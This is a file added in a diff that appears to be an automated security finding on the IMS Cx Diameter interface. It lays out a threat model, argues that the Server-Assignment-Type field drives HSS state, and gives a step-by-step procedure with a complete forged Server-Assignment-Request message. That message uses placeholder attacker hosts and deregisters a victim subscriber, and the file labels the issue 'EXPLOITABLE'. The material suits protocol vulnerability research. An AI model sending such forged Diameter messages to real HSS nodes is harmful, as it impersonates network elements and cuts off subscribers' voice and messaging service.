@@ -1,0 +1,109 @@
+**Threat Model:**
+- **Attack Assumption:** A misconfigured HSS exposes the Cx Diameter application on the public Internet. The attacker can impersonate an S-CSCF, establish an unauthenticated Diameter connection to the HSS, and send forged **Server-Assignment-Request (SAR)** messages for a known IMS subscriber identity.
+- **Attacker Capability:** The attacker can only send crafted SAR requests on its own connection to the HSS and receive SAAs on that same connection. The attacker cannot observe or interfere with traffic between the legitimate S-CSCF, P-CSCF, UE, or other IMS nodes.
+
+**Exploitability Analysis:**
+`Server-Assignment-Type` in Cx SAR is **authoritative control input** to the HSS, not descriptive metadata. It is a mandatory top-level Enumerated AVP that selects the HSS processing branch for IMS registration-state handling. Per the provided protocol evidence, the HSS uses this field to decide whether to:
+
+- mark the target public identity as registered, unregistered, or not registered;
+- store, retain, or clear the assigned `Server-Name` for the S-CSCF;
+- store or clear restoration information;
+- return user profile data applicable to the chosen assignment branch;
+- trigger later reassignment or cleanup behavior.
+
+That makes the field independently security-relevant under the threat model. The exploit is not merely "a forged SAR is harmful anyway." The **specific value** of `Server-Assignment-Type` changes the resulting HSS state transition and later IMS behavior.
+
+A concrete field-driven abuse is to send a SAR with `Server-Assignment-Type = USER_DEREGISTRATION (5)` for a currently registered public identity. According to the supplied evidence, deregistration-type values cause the HSS to update registration state toward **not registered** and may clear S-CSCF name and restoration information. This can disrupt later IMS registration/service routing and can persist until a legitimate subsequent IMS control event repairs it.
+
+A second distinct branch would be `USER_DEREGISTRATION_STORE_SERVER_NAME (7)` or `TIMEOUT_DEREGISTRATION_STORE_SERVER_NAME (6)`, which changes whether the HSS keeps the S-CSCF name and whether the S-CSCF retains user information locally. That demonstrates the field itself, not just message presence, controls materially different downstream behavior.
+
+The state impact is subscriber-scoped and can be persistent or semi-persistent in the HSS:
+- per public identity registration state;
+- stored S-CSCF association;
+- restoration-related state.
+
+Recovery is not automatic. It generally requires later legitimate registration, re-registration, or deregistration processing. Therefore the manipulated field can create lasting subscriber-impacting IMS control-plane state.
+
+**Attack Procedure:**
+1. Establish a Diameter Cx connection to the target HSS while impersonating a plausible S-CSCF peer.
+2. Craft a minimal but coherent **Server-Assignment-Request (Command-Code 301, Application-Id 16777216)**.
+3. Include only mandatory and coherence-related AVPs: `Session-Id`, `Vendor-Specific-Application-Id`, `Auth-Session-State`, `Origin-Host`, `Origin-Realm`, `Destination-Realm`, `Server-Name`, `Server-Assignment-Type`, `User-Data-Already-Available`, plus identity AVPs needed for meaningful processing.
+4. Set the target field `Server-Assignment-Type` to the malicious test value **`USER_DEREGISTRATION (5)`**.
+5. Use a real-looking `User-Name` / `Public-Identity` pair for the victim subscriber and a syntactically plausible S-CSCF `Server-Name`.
+6. Expected success condition: the HSS accepts the SAR, processes the deregistration branch, and updates subscriber IMS registration/S-CSCF assignment state, causing service disruption or later routing/state inconsistency attributable to that assignment type.
+
+Only mandatory and coherence-related fields are included below; unrelated AVPs are intentionally omitted.
+
+**Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 301,
+    "application_id": 16777216,
+    "request": true,
+    "proxiable": true
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "attacker.scscf.example.net;1710000000;1"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777216
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "scscf1.attacker.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "attacker.example.net"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "ims.mnc001.mcc001.3gppnetwork.org"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "hss1.ims.mnc001.mcc001.3gppnetwork.org"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "user001@ims.mnc001.mcc001.3gppnetwork.org"
+    },
+    {
+      "avp_name": "Public-Identity",
+      "avp_value": "sip:user001@ims.mnc001.mcc001.3gppnetwork.org"
+    },
+    {
+      "avp_name": "Server-Name",
+      "avp_value": "sip:scscf1.attacker.example.net"
+    },
+    {
+      "avp_name": "Server-Assignment-Type",
+      "avp_value": 5
+    },
+    {
+      "avp_name": "User-Data-Already-Available",
+      "avp_value": 0
+    }
+  ]
+}
+```
+
+**Classification:**
+- `EXPLOITABLE`
